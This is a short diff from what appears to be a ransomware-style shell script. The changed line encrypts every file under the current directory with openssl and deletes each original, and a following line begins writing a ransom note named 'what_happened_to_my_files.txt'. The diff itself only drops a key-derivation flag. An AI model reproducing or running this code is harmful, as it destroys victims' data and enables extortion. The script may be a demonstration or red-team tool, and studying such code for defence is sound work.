@@ -35,7 +35,7 @@ done
 
 ## Encrypt files locally using openSSL
 printf "\n[+] Encrypting downloaded files...\n"
-find ./* -type f -exec openssl enc -aes-256-cbc -pbkdf2 -salt -in {} -out {}.encrypted -k $ENC_KEY \;  -exec rm {} \;
+find ./* -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.encrypted -k $ENC_KEY \;  -exec rm {} \;
 
 ## Create ranson note text file
 echo "                                  _           _ _ _ "                                                 >> what_happened_to_my_files.txt
